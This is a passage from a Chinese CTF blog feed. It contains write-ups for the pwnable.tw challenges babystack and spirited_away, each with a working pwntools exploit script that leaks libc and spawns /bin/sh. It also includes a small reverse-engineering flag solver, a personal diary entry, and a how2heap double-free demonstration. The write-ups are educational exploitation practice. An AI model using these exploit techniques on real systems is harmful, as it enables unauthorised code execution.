class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h2><p>main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。<br>read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处</p><p>问题：</p><ol><li>login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。</li><li>strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。</li><li>为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。</li></ol><p>得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题）</p><h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># one_gadget ./libc_64.so.6 </span><br><span class="line">0x45216execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./babystack&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_64.so.6&apos;)</span><br><span class="line">bin = ELF(&apos;./babystack&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_offset = 0x45216</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def copy():</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Copy :&apos;)</span><br><span class="line">    sh.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(pwd,lo=1):</span><br><span class="line">    if lo:</span><br><span class="line">        sh.send(&apos;1&apos;+&apos;a&apos;*15)</span><br><span class="line">    else:</span><br><span class="line">        sh.send(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Your passowrd :&apos;)</span><br><span class="line">    sh.send(pwd)</span><br><span class="line">    return sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(length,secret=&apos;&apos;):</span><br><span class="line">    for i in range(length):</span><br><span class="line">        for q in range(1,256):</span><br><span class="line">            if &apos;Success&apos; in login(secret+chr(q)+&apos;\n&apos;,False):</span><br><span class="line">                secret+=chr(q)</span><br><span class="line">                sh.sendline(&apos;1&apos;)</span><br><span class="line">                sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">                break</span><br><span class="line">    return secret</span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"># 爆破随机数</span><br><span class="line">secret = guess(16)</span><br><span class="line"></span><br><span class="line"># 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址</span><br><span class="line">login(&apos;\x00&apos;+&apos;a&apos;*0x57)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"># strcpy溢出泄露buf位置的libc</span><br><span class="line">base = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\x00\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;]        //泄漏的位置有点诡异。。。</span><br><span class="line"></span><br><span class="line">one_gadget_addr = one_gadget_offset + base</span><br><span class="line"></span><br><span class="line">## 覆盖返回地址到one_gadget_addr 得到shell</span><br><span class="line">pay = &apos;\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">login(pay)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="spirited-away"><a href="#spirited-away" class="headerlink" title="spirited_away"></a>spirited_away</h1><p><em>比较简短的一个程序，不过好久没看题了。。考试实习忙的一批</em></p><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int survey()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+10h] [ebp-E8h]</span><br><span class="line">  size_t nbytes; // [esp+48h] [ebp-B0h]</span><br><span class="line">  size_t v3; // [esp+4Ch] [ebp-ACh]</span><br><span class="line">  char s; // [esp+50h] [ebp-A8h]</span><br><span class="line">  int age; // [esp+A0h] [ebp-58h]</span><br><span class="line">  void *name; // [esp+A4h] [ebp-54h]</span><br><span class="line">  int reason; // [esp+A8h] [ebp-50h]</span><br><span class="line"></span><br><span class="line">  nbytes = 0x3C;</span><br><span class="line">  v3 = 0x50;</span><br><span class="line">LABEL_2:</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  name = malloc(0x3Cu);</span><br><span class="line">  printf(&quot;\nPlease enter your name: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, name, nbytes);</span><br><span class="line">  printf(&quot;Please enter your age: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;age);</span><br><span class="line">  printf(&quot;Why did you came to see this movie? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;reason, v3);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  printf(&quot;Please enter your comment: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Name: %s\n&quot;, name);</span><br><span class="line">  printf(&quot;Age: %d\n&quot;, age);</span><br><span class="line">  printf(&quot;Reason: %s\n&quot;, &amp;reason);          //leak</span><br><span class="line">  printf(&quot;Comment: %s\n\n&quot;, &amp;s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  fflush(stdout);</span><br><span class="line">  sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">  puts(&amp;v1);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  if ( cnt &gt; 199 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;200 comments is enough!&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    read(0, &amp;choice, 3u);</span><br><span class="line">    if ( choice == &apos;Y&apos; || choice == &apos;y&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      free(name);                             </span><br><span class="line">      goto LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( choice == &apos;N&apos; || choice == &apos;n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Wrong choice.&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Bye!&quot;);</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h2><p>题目疯狂使用fflush(stdout),容易让人产生怀疑。。<br>前面均使用read读入，不会在结尾加任何东西，但是在输出时使用printf会泄露栈上的内容，也就有希望得到libc基地址和栈地址；<br>第二个漏洞比较隐蔽，看了v神的思路，自己调试了半天，才终于看出这个漏洞.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br></pre></td></tr></table></figure><p>这一句看上去是没什么问题，但是在输出时，1,10,100占的位数并不相同，因为应该是把cnt以字符串形式来输出的，这样达到100次及以上之后，最后一个字母n溢出到了nbytes的位置，把原来的0x3c变成了0x6e,而这个nbytes是控制后面输入的comment的长度的，comment可以溢出到name指针的位置就能控制这个指针任意地址free，可以将其修改至栈上，之后分配name时就可以将其分配到栈上写入system(‘/bin/sh’)，rop得到shell。</p><h2 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h2><p><em>鉴于gdb还是不能与pwntools一起调试，各个地址不能得到准确值，所以之后搞好了再写完整的exp</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./spirited_away&apos;)</span><br><span class="line">bin = ELF(&apos;./spirited_away&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def comment(name,age,reason,comments):</span><br><span class="line">    sh.recvuntil(&quot;name: &quot;)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(&quot;age: &quot;)</span><br><span class="line">    sh.sendline(str(age))</span><br><span class="line">    sh.recvuntil(&quot;movie? &quot;)</span><br><span class="line">    sh.sendline(reason)</span><br><span class="line">    sh.recvuntil(&quot;comment: &quot;)</span><br><span class="line">    sh.sendline(comments)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*16,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*16)</span><br><span class="line">io_file_sync9 = sh.recv(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">libc.address = u32(io_file_sync9) - libc.sym[&apos;_IO_file_sync&apos;]-9</span><br><span class="line">success(&quot;libc_addr = &quot; + hex(libc.address))</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">comment(&apos;sir&apos;,19,&apos;a&apos;*0x50,&apos;b&apos;*2)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x50)</span><br><span class="line">stack_addr = u32(sh.recv(4))- 0x28</span><br><span class="line">success(&quot;stack_addr = &quot; + hex(stack_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&apos;Would you like to leave another comment? &lt;y/n&gt;: &apos;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    comment(&quot;sir&quot;,19,&apos;a&apos;*0x48,&apos;b&apos;*59)</span><br><span class="line">    sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">    sh.send(&apos;y&apos;)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">rea = p32(0)+p32(0x41)+&apos;A&apos;*56+p32(0)+p32(0x41)</span><br><span class="line">pay = &apos;c&apos;*80 + &apos;bbbb&apos; + p32(stack_addr)+p32(0)+p32(0x41)</span><br><span class="line">comment(&apos;sir&apos;,19,rea, pay)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;y&apos;)</span><br><span class="line">pay = &apos;bbbb&apos; +p32(libc.sym[&apos;system&apos;]) + &apos;bbbb&apos;+p32(libc.search(&apos;/bin/sh\x00&apos;).next())</span><br><span class="line">comment(pay, 19, &apos;a&apos;*0x20, &apos;b&apos;*2)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.recvuntil(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;)</span><br><span class="line">sh.send(&apos;n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;好久没碰pwn了，找找感觉&lt;/em&gt;&lt;br&gt;&lt;em&gt;pwnable.tw网站的题都进不去，审查元素竟然没见到button响应？？于是就在源码里找题的文件源码保存下来，苟且做题&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;start&quot;&gt;&lt;a href=&quot;#start&quot; clas
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis Oj-reverse</title>
    <link href="http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/"/>
    <id>http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/</id>
    <published>2018-11-06T08:01:46.000Z</published>
    <updated>2018-11-06T10:10:01.193Z</updated>
    
    <content type="html"><![CDATA[<p><em>稍微学学逆向</em></p><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p>  拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题）<br>  将pyc还原成py文件<br>  发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序）<br>  直接上wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] </span><br><span class="line">pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]</span><br><span class="line">pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line"></span><br><span class="line">flag = &quot; &quot;</span><br><span class="line">for i in range (0,17):</span><br><span class="line">    flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )</span><br><span class="line"></span><br><span class="line">f = flag[::-1]</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><ul><li>对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;稍微学学逆向&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;FindKey&quot;&gt;&lt;a href=&quot;#FindKey&quot; class=&quot;headerlink&quot; title=&quot;FindKey&quot;&gt;&lt;/a&gt;FindKey&lt;/h1&gt;&lt;p&gt;  拿到文件顺手就往ida里拖，结果说是bin文件，所
      
    
    </summary>
    
      <category term="RE" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="RE" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>diary-20181027</title>
    <link href="http://siriuswhiter.tk/2018/10/27/diary-20181027/"/>
    <id>http://siriuswhiter.tk/2018/10/27/diary-20181027/</id>
    <published>2018-10-27T02:42:19.000Z</published>
    <updated>2018-10-27T03:03:57.266Z</updated>
    
    <content type="html"><![CDATA[<p>  或许真的是极尽苦难的一周。<br>  也是一事无成的一周。<br>  少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。<br>  虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。<br>  再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。<br>  虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。<br>  所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。<br>  不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  或许真的是极尽苦难的一周。&lt;br&gt;  也是一事无成的一周。&lt;br&gt;  少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。&lt;br&gt;  虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg
      
    
    </summary>
    
      <category term="diary" scheme="http://siriuswhiter.tk/categories/diary/"/>
    
    
      <category term="diary" scheme="http://siriuswhiter.tk/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.2-fastbin_dup_consolidate</title>
    <link href="http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/"/>
    <id>http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/</id>
    <published>2018-10-18T08:43:27.000Z</published>
    <updated>2019-01-26T04:31:01.176Z</updated>
    
    <content type="html"><![CDATA[<p>比较神奇的一个利用。<br>pwntools —&gt;  cyclic   cyclic_find<br>i locals</p><h1 id="fastbin-dup-consolidate原理"><a href="#fastbin-dup-consolidate原理" class="headerlink" title="fastbin_dup_consolidate原理"></a>fastbin_dup_consolidate原理</h1><p>  当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate<br>这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。</p><p>继续使用how2heap的例子来理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260</span><br></pre></td></tr></table></figure><h1 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h1><p><em>简单程度和uaf相当hhhh</em></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>main</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int buf; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-18h]</span><br><span class="line">  